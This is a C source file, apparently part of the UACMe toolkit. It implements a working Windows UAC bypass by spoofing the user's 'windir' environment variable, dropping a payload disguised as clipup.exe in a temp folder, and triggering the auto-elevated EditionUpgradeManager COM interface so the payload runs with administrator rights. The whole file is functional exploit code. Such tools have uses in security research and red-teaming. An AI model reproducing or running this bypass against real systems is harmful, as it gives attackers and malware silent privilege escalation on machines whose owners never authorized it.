/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2023
*
*  TITLE:       RINN.C
*
*  VERSION:     3.65
*
*  DATE:        25 Sep 2023
*
*  FBK UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmEditionUpgradeManagerMethod
*
* Purpose:
*
* Bypass UAC using EditionUpgradeManager autoelevated interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
* EditionUpgradeManager has method called AcquireModernLicenseWithPreviousId.
* During it execution MS code starts Clipup.exe process from (what it suppose) windows system32 folder.
* However since MS programmers always lazy and banned in their own documentation it uses
* environment variable "windir" to expand Windows directory instead of using something like GetSystemDirectory.
* This giving us opportunity (hello Nadela) to spoof current user environment variable for requested DllHost.exe
* thus turning their code launch our clipup.exe from our controlled location.
*
*/
NTSTATUS ucmEditionUpgradeManagerMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS                    MethodResult = STATUS_ACCESS_DENIED;
    BOOL                        bEnvSet = FALSE;
    HRESULT                     hr_init;
    IEditionUpgradeManager     *Manager = NULL;

    DWORD Data[3];

    LPOLESTR lpGuidDir = NULL;
    LPWSTR lpPath = NULL;
    LPWSTR stringPtr = NULL;

    SIZE_T nLen;

    GUID guidTemp;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        if (CoCreateGuid(&guidTemp) != S_OK)
            break;

        if (StringFromCLSID(&guidTemp, &lpGuidDir) != S_OK)
            break;

        nLen = (1 + _strlen(lpGuidDir) + (MAX_PATH * 2)) * sizeof(WCHAR);
        lpPath = (LPWSTR)supHeapAlloc(nLen);
        if (lpPath == NULL)
            break;

        //
        // Replace default Fubuki dll entry point with new and remove dll flag.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_DEFAULT_ENTRYPOINT,
            TRUE))
        {
            break;
        }

        //
        // Create %temp%\{GUID} directory.
        //
        
        _strcpy(lpPath, g_ctx->szTempDirectory);
        stringPtr = _strcat(lpPath, lpGuidDir);

        if (!CreateDirectory(lpPath, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;

        //
        // Set controlled environment variable.
        //
        bEnvSet = supSetEnvVariable(FALSE,
            NULL,
            T_WINDIR,
            lpPath);

        if (!bEnvSet)
            break;

        //
        // Create %temp%\{GUID}\system32 directory.
        //
        _strcat(lpPath, SYSTEM32_DIR);
        if (!CreateDirectory(lpPath, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;

        //
        // Drop payload to %temp%\system32 as clipup.exe and run target interface.
        //
        _strcat(lpPath, CLIPUP_EXE);
        if (supWriteBufferToFile(lpPath, ProxyDll, ProxyDllSize)) {

            if (FAILED(ucmAllocateElevatedObject(T_CLSID_EditionUpgradeManager,
                &IID_EditionUpgradeManager,
                CLSCTX_LOCAL_SERVER,
                &Manager)))
            {
                break;
            }

            if (Manager == NULL) {
                break;
            }

            Data[0] = 'f';
            Data[1] = 'f';
            Data[2] = 0;

            Manager->lpVtbl->AcquireModernLicenseWithPreviousId(Manager, MYSTERIOUSCUTETHING, (PDWORD)&Data);

        }

    } while (FALSE);

    if (Manager)
        Manager->lpVtbl->Release(Manager);

    //
    // Cleanup section.
    //
    //  1. Remove variable.
    //  2. Remove payload file.
    //  3. Remove fake directories.
    //
    if (bEnvSet)
        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);

    CoTaskMemFree(lpGuidDir);

    supWaitForGlobalCompletionEvent();

    if (lpPath && stringPtr) {

        DeleteFile(lpPath);

        *stringPtr = 0;
        _strcat(lpPath, SYSTEM32_DIR);
        RemoveDirectory(lpPath);

        *stringPtr = 0;
        RemoveDirectory(lpPath);

        supHeapFree(lpPath);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}
